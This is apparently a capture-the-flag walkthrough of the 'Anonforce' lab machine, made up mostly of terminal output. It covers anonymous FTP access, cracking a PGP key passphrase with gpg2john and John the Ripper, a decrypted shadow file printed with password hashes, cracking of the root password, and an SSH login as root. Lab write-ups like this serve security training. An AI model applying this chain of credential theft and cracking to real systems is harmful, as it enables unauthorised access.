@@ -1,0 +1,199 @@
+Anonforce is an easy boot2root machine.
+Nmap scan results;
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
+| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
+| drwxr-xr-x   17 0        0            3700 Oct 29 00:24 dev
+| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
+| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
+| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
+| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
+| drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
+| drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
+| drwx------    2 0        0           16384 Aug 11  2019 lost+found
+| drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
+| drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
+| drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
+| drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
+| dr-xr-xr-x   94 0        0               0 Oct 29 00:24 proc
+| drwx------    3 0        0            4096 Aug 11  2019 root
+| drwxr-xr-x   18 0        0             540 Oct 29 00:25 run
+| drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
+| drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
+| dr-xr-xr-x   13 0        0               0 Oct 29 00:24 sys
+|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.9.81.62
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)
+|   256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)
+|_  256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=10/29%OT=21%CT=1%CU=43569%PV=Y%DS=2%DC=T%G=Y%TM=5F9A71
+OS:A2%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)OP
+OS:S(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST
+OS:11NW6%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
+OS:N(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
+OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
+OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
+OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
+OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
+OS:D=S)
+
+
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-rw-r--    1 1000     1000           33 Aug 11  2019 user.txt
+226 Directory send OK.
+ftp> get user.txt
+local: user.txt remote: user.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for user.txt (33 bytes).
+226 Transfer complete.
+33 bytes received in 0.00 secs (148.5095 kB/s)
+ftp> ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 .
+drwxr-xr-x    3 0        0            4096 Aug 11  2019 ..
+-rw-------    1 0        0             117 Aug 11  2019 .bash_history
+-rw-r--r--    1 1000     1000          220 Aug 11  2019 .bash_logout
+-rw-r--r--    1 1000     1000         3771 Aug 11  2019 .bashrc
+drwx------    2 1000     1000         4096 Aug 11  2019 .cache
+drwxrwxr-x    2 1000     1000         4096 Aug 11  2019 .nano
+-rw-r--r--    1 1000     1000          655 Aug 11  2019 .profile
+-rw-r--r--    1 1000     1000            0 Aug 11  2019 .sudo_as_admin_successful
+-rw-r--r--    1 0        0             183 Aug 11  2019 .wget-hsts
+-rw-rw-r--    1 1000     1000           33 Aug 11  2019 user.txt
+226 Directory send OK.
+ftp> exit
+221 Goodbye.
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Anonforce# cat user.txt 
+606083fd33beb###################
+
+So now that we have got user.txt,we can further proceed with privilege escalation.
+I found out two files in notread folder.
+private.asc and backup.pgp
+
+This looks interesting.
+I tried to decrypt the backup.pgp using private.asc using the following command.
+
+gpg --import private.asc 
+
+But it asked for a passphrase so then I researched for a bit and found out that we can use the tool named
+gpg2john by JohntheRipper.
+
+gpg2john private.asc > hash
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Anonforce# john hash --wordlist=/home/akshay/Downloads/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+Cost 1 (s2k-count) is 65536 for all loaded hashes
+Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
+Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+xbox360          (anonforce)
+1g 0:00:00:00 DONE (2020-10-29 15:46) 4.347g/s 4069p/s 4069c/s 4069C/s lolipop..yourmom
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Anonforce# gpg --import private.asc 
+gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
+gpg: key B92CD1F280AD82C2: secret key imported
+gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
+gpg: Total number processed: 2
+gpg:              unchanged: 2
+gpg:       secret keys read: 1
+gpg:   secret keys imported: 1
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Anonforce# gpg --decrypt 
+.bash_logout          backup.pgp            hash                  hydra.restore         private.asc           user.txt              walkthrough.txt       
+.walkthrough.txt.swp  crontab               home                  passwd                shadow                version               
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Anonforce# gpg --decrypt backup.pgp 
+
+Ok we got a backup of shadow file, that's cool :)
+
+root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+messagebus:*:18120:0:99999:7:::
+uuidd:*:18120:0:99999:7:::
+melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
+sshd:*:18120:0:99999:7:::
+ftp:*:18120:0:99999:7:::root@LAPTOP-U5913CMD:/home/akshay/Desktop/Anonforce# nano shadow
+
+Now we can crack the hashes using john and rockyou.txt as a default wordlist.
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Anonforce# rm shadow
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Anonforce# nano shadow
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Anonforce# john shadow --wordlist=/home/akshay/Downloads/rockyou.txt 
+Warning: only loading hashes of type "sha512crypt", but also saw type "md5crypt"
+Use the "--format=md5crypt" option to force loading hashes of that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+hikari           (root)
+1g 0:00:00:01 DONE (2020-10-29 15:47) 0.5464g/s 4196p/s 4196c/s 4196C/s honeybear..somebody
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Anonforce# 
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop# ssh root@10.10.159.61
+root@10.10.159.61's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-157-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+root@ubuntu:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@ubuntu:~# cd /root
+root@ubuntu:~# ls
+root.txt
+root@ubuntu:~# cat root.txt
+f706456440c7#####################
